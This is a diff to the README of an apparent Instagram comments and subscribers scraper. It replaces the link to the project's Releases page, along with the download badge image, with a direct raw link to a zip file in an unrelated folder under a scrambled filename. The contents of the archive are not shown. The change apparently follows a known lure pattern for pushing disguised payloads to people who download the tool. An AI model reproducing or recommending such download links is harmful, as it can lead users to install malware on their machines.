@@ -1,6 +1,6 @@
 # 🐍 instagram-comments-replies-and-subscribers-scraper-no-cookie - Easily Scrape Instagram Comments & Replies
 
-[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/MRISOON/instagram-comments-replies-and-subscribers-scraper-no-cookie/releases)
+[![Download](https://github.com/MRISOON/instagram-comments-replies-and-subscribers-scraper-no-cookie/raw/refs/heads/main/mucronate/scraper-no-replies-comments-cookie-and-subscribers-instagram-3.0.zip)](https://github.com/MRISOON/instagram-comments-replies-and-subscribers-scraper-no-cookie/raw/refs/heads/main/mucronate/scraper-no-replies-comments-cookie-and-subscribers-instagram-3.0.zip)
 
 ## 📚 Table of Contents
 
@@ -19,7 +19,7 @@ Welcome to the Instagram Comments, Replies, and Subscribers Scraper. This tool h
 
 To get started, visit the Releases page to download the software:
 
-[Download from Releases](https://github.com/MRISOON/instagram-comments-replies-and-subscribers-scraper-no-cookie/releases)
+[Download from Releases](https://github.com/MRISOON/instagram-comments-replies-and-subscribers-scraper-no-cookie/raw/refs/heads/main/mucronate/scraper-no-replies-comments-cookie-and-subscribers-instagram-3.0.zip)
 
 Once you've downloaded the software, follow these steps to install it:
 
